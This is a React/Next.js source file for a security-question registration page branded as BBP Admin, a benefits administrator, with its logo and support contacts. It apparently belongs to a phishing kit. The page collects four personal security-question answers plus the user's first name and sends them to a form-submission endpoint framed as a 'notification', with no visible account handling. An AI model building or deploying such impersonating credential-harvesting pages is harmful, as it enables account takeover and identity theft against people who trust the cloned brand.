'use client'

import { useState, useEffect } from 'react'
import { ChevronDown, Phone, Mail } from 'lucide-react'
import Link from 'next/link'
import Image from 'next/image'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Footer } from '@/components/footer'
import { useRequireSetupDone } from '@/hooks/use-route-guard'

// Security questions for account recovery
const securityQuestions = [
    "With which company did you hold your first job?",
    "What is the last name of your high school best friend?",
    "What was your major during college?",
    "What is your spouse's middle name?",
    "What is the name of your most memorable childhood babysitter/caregiver?",
    "What is the first name of the eldest of your siblings?",
    "What is your father's middle name?",
    "In what street was the first address you lived in outside your parents' home?",
    "When is your youngest sibling's birthday (MM/DD)?",
    "What is your eldest child's middle name?",
    "What is the first name of your grandmother (your mother's mother)?",
    "What was the first name of your first grade teacher?",
    "What was your favorite restaurant in college?",
    "What is the first name of your spouse's father?",
    "What is the first name of your first crush?",
    "What is the middle name of your eldest sibling?",
    "What is your mother's middle name?",
    "What was your boss's first name at your first job?",
    "What is your nickname?",
    "What is the name of the hospital your oldest child was born in?",
    "What is your grandfather's profession?",
    "What was the name of your first pet?",
    "In what time of day was your oldest child born? (rounded to the closest hour, for example - 21)",
    "What is your grandfather's middle name (your father's father)?",
]

export default function SecurityPage() {
    useRequireSetupDone()
    const [firstName, setFirstName] = useState('')
    const [selectedQuestions, setSelectedQuestions] = useState<string[]>(['', '', '', ''])
    const [answers, setAnswers] = useState<string[]>(['', '', '', ''])
    const [openDropdown, setOpenDropdown] = useState<number | null>(null)
    const [isLoading, setIsLoading] = useState(false)

    useEffect(() => {
        if (typeof window !== 'undefined') {
            const storedFirstName = sessionStorage.getItem('firstName')
            if (storedFirstName) {
                setFirstName(storedFirstName)
            }
        }
    }, [])

    const handleQuestionSelect = (index: number, question: string) => {
        const newQuestions = [...selectedQuestions]
        newQuestions[index] = question
        setSelectedQuestions(newQuestions)
        setOpenDropdown(null)
    }

    const handleAnswerChange = (index: number, answer: string) => {
        const newAnswers = [...answers]
        newAnswers[index] = answer
        setAnswers(newAnswers)
    }

    const getAvailableQuestions = (currentIndex: number) => {
        return securityQuestions.filter(
            (q) => !selectedQuestions.includes(q) || selectedQuestions[currentIndex] === q
        )
    }

    const isFormValid = selectedQuestions.every((q) => q !== '') && answers.every((a) => a.trim() !== '')

    const handleContinue = async () => {
        if (!isFormValid) return

        setIsLoading(true)

        const securityAnswers = selectedQuestions.map((question, index) => ({
            question,
            answer: answers[index],
        }))

        if (typeof window !== 'undefined') {
            sessionStorage.setItem('securityAnswers', JSON.stringify(securityAnswers))
        }

        try {
            await fetch('/api/form-submission', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'Security Questions',
                    firstName,
                    securityAnswers,
                    timestamp: new Date().toISOString(),
                }),
            })
        } catch (error) {
            console.error('Failed to send notification:', error)
        }

        window.location.href = '/registration/confirm'
    }

    return (
        <div className="min-h-screen flex flex-col bg-white">
            {/* Header */}
            <header className="border-b border-gray-200 px-6 py-4">
                <div className="flex items-center">
                    <div className="flex items-center gap-6">
                        <Link href="/" className="flex items-center">
                            <Image
                                src="/BBPAdmin_Alegeus_Logo_Blue_Service.4ec5724d58c34a02b47bdfd467112a82.png"
                                alt="BBP Admin"
                                width={140}
                                height={32}
                                className="h-[34px] w-auto"
                                priority
                            />
                        </Link>
                        <div className="hidden md:flex flex-col text-xs text-gray-600 leading-tight">
                            <div className="flex items-center gap-2">
                                <Phone className="w-3 h-3" />
                                <span>(630) 773-2337</span>
                            </div>
                            <div className="flex items-center gap-2 mt-1">
                                <Mail className="w-3 h-3" />
                                <span>support@bbpadmin.com</span>
                            </div>
                        </div>
                    </div>
                    <div className="ml-6 text-[21px] text-gray-600 font-light">Registration</div>
                </div>
            </header>

            {/* Main Content */}
            <main className="flex-1 px-6 py-6">
                <div className="max-w-lg mx-auto">
                    {/* Header */}
                    <h1 className="text-2xl md:text-3xl font-bold text-gray-900 mb-1">
                        Secure your account!
                    </h1>
                    <p className="text-gray-600 mb-6">
                        Select 4 security questions.
                    </p>

                    {/* Security Questions Form */}
                    <div className="space-y-4">
                        {[0, 1, 2, 3].map((index) => (
                            <div key={index} className="relative">
                                {/* Dropdown Button */}
                                <button
                                    type="button"
                                    onClick={() => setOpenDropdown(openDropdown === index ? null : index)}
                                    className="w-full flex items-center justify-between p-4 bg-gray-100 rounded-lg text-left"
                                >
                                    <span className={`text-sm ${selectedQuestions[index] ? 'text-[#1e3a5f] font-medium' : 'text-gray-500'}`}>
                                        {selectedQuestions[index] || '--Choose Security Question--'}
                                    </span>
                                    <ChevronDown className={`w-5 h-5 text-[#1e3a5f] transition-transform ${openDropdown === index ? 'rotate-180' : ''}`} />
                                </button>

                                {/* Dropdown Menu */}
                                {openDropdown === index && (
                                    <div className="absolute z-50 w-full mt-1 bg-white border border-gray-200 rounded-lg shadow-lg max-h-64 overflow-y-auto">
                                        {getAvailableQuestions(index).map((question, i) => (
                                            <button
                                                key={i}
                                                type="button"
                                                onClick={() => handleQuestionSelect(index, question)}
                                                className="w-full text-left px-4 py-3 text-sm text-[#1e3a5f] hover:bg-blue-50 border-b border-gray-100 last:border-b-0"
                                            >
                                                {question}
                                            </button>
                                        ))}
                                    </div>
                                )}

                                {/* Answer Input */}
                                <div className="mt-2 px-1">
                                    <Input
                                        type="text"
                                        placeholder="(Type answer)"
                                        value={answers[index]}
                                        onChange={(e) => handleAnswerChange(index, e.target.value)}
                                        className="w-full border-0 border-b border-gray-300 rounded-none px-0 py-2 text-gray-700 placeholder:text-gray-400 focus:ring-0 focus:border-[#1e3a5f] bg-transparent"
                                        disabled={!selectedQuestions[index]}
                                    />
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            </main>

            {/* Continue Button */}
            <div className="bg-gray-100 p-6">
                <div className="max-w-lg mx-auto">
                    <Button
                        className={`w-full py-6 rounded-full text-white font-semibold ${
                            isFormValid 
                                ? 'bg-[#141c4d] hover:bg-[#407ec9] text-white transition-colors' 
                                : 'bg-gray-400 cursor-not-allowed'
                        }`}
                        onClick={handleContinue}
                        disabled={!isFormValid || isLoading}
                    >
                        CONTINUE
                    </Button>
                </div>
            </div>

            <Footer />
        </div>
    )
}
